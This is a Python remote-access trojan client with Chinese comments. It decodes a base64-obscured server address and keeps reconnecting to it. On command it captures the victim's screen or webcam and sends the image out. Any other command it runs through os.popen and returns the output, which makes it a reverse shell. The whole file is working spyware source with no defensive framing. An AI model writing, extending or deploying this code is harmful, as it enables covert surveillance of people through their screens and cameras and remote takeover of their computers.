import sys
import base64
import socket
import time
import os
from PyQt5.QtWidgets import QApplication, QMessageBox
from PyQt5.QtGui import QGuiApplication, QPixmap
import cv2

def show_error_popup(title, message):
    app = QApplication(sys.argv)
    msg = QMessageBox()
    msg.setIcon(QMessageBox.Critical)
    msg.setText(message)
    msg.setWindowTitle(title)
    msg.exec_()
    app.quit()

def take_screenshot():
    app = QApplication(sys.argv)
    screen = QGuiApplication.primaryScreen()
    img = screen.grabWindow(0).toImage()
    img_path = "screenshot.jpg"
    img.save(img_path)
    app.quit()
    return img_path

def take_webcam_screenshot():
    cap = cv2.VideoCapture(0)  # 使用默认摄像头
    if not cap.isOpened():
        print("摄像头打开失败")
        return None

    ret, frame = cap.read()  # 读取一帧
    if not ret:
        print("无法从摄像头获取图像")
        cap.release()
        return None

    img_path = "webcam_screenshot.jpg"
    cv2.imwrite(img_path, frame)
    cap.release()
    return img_path

def send_image(s, img_path):
    if not img_path:
        s.sendall(b"0")
        print("没有图像可发送")
        return

    img_size = os.path.getsize(img_path)

    # 发送图片大小
    s.sendall(str(img_size).encode())

    # 发送图片数据
    with open(img_path, "rb") as f:
        s.sendfile(f)
    print("图片已发送给服务器")

    # 删除本地的图片文件
    # os.remove(img_path)
    # print(f"已删除本地的图片文件: {img_path}")

# 移除了 show_error_popup 函数定义

def start_client(encoded_ip, encoded_port):
    server_ip = base64.b64decode(encoded_ip).decode()
    server_port = int(base64.b64decode(encoded_port).decode())

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((server_ip, server_port))
                connected = True
                print(f"已连接到服务器 {server_ip}:{server_port}")
                
                while connected:
                    try:
                        data = s.recv(100000).decode()
                        if not data:
                            connected = False
                            break

                        if data == "截图":
                            img_path = take_screenshot()
                            send_image(s, img_path)
                            
                        elif data == "摄像头截图":
                            img_path = take_webcam_screenshot()
                            send_image(s, img_path)

                        else:
                            result = os.popen(data).read()
                            message = result if result else '返回值为空'
                            s.sendall(message.encode())

                    except (ConnectionResetError, BrokenPipeError):
                        connected = False
                        break

        except (socket.error, ConnectionRefusedError) as e:
            print(f"无法连接到服务器: {e}")
            print("重新连接服务器...")
            time.sleep(5)

def main():
    encoded_ip = 'you server IP base64'   # 服务器IP的Base64编码
    encoded_port = 'you port base64'         # 端口的Base64编码
    start_client(encoded_ip, encoded_port)

if __name__ == "__main__":
    main()
